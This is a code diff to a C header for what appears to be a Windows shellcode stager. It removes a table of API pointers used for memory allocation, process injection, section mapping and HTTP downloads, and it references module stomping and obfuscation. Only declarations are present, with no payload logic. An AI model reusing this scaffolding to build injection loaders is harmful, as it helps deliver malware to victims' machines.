@@ -3,8 +3,8 @@
 #include <windows.h>
 #include <winhttp.h>
 
-#include <macros.h>
-#include <native.h>
+#include <Macros.h>
+#include <Native.hh>
 #include <obfuscation/chacha.h>
 
 #ifdef STAGER
@@ -106,35 +106,7 @@ BOOL InitInstance(
 typedef struct _INSTANCE {
     PTEB Teb;
     struct {
-        
-        HMODULE  (WINAPI *LoadLibraryExA)(LPCSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
-        WINBOOL  (WINAPI *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
-        LPVOID   (WINAPI *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
-        WINBOOL  (WINAPI *WriteProcessMemory)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
-        HANDLE   (WINAPI *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
-        HANDLE   (WINAPI *CreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
-        LPVOID   (WINAPI *MapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
-        HMODULE  (WINAPI *LoadLibraryA)(LPCSTR lpLibFileName);
-        DWORD    (WINAPI *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
-        NTSTATUS (NTAPI *NtCreateSection)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
-        NTSTATUS (NTAPI *NtMapViewOfSection)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, SECTION_INHERIT InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
-        NTSTATUS (NTAPI *SystemFunction040)( PVOID Memory, ULONG MemorySize, ULONG OptionFlags );
-        HANDLE   (NTAPI *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
-
-        HLOCAL  (WINAPI *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
-        HLOCAL  (WINAPI *LocalFree)(HLOCAL hMem);
-        HLOCAL  (WINAPI *LocalReAlloc)(HLOCAL hMem, SIZE_T uBytes, UINT uFlags);
-
-        HINTERNET (*WinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
-        HINTERNET (*WinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved);
-        HINTERNET (*WinHttpOpenRequest)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags);
-        BOOL      (*WinHttpReceiveResponse)(HINTERNET hRequest, LPVOID lpReserved);
-        BOOL      (*WinHttpSendRequest)(HINTERNET hRequest, LPCWSTR pwszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
-        BOOL      (*WinHttpReadData)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
-        BOOL      (*WinHttpSetOption)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
-        BOOL      (*WinHttpCloseHandle)(HINTERNET hInternet);
-
-        VOID     (*BlackoutMain)( PVOID );
+        VOID (*BlackoutMain)( PVOID );
     } Win32;
 
     DWORD InjectionTechnique;
@@ -147,4 +119,4 @@ typedef struct _STOMP_ARGS {
     UINT64 Length;
 } STOMP_AGRS, *PSTOMP_ARGS;
 
-typedef (*ShellcodeMain)();
+typedef VOID (*ShellcodeMain)( PVOID );
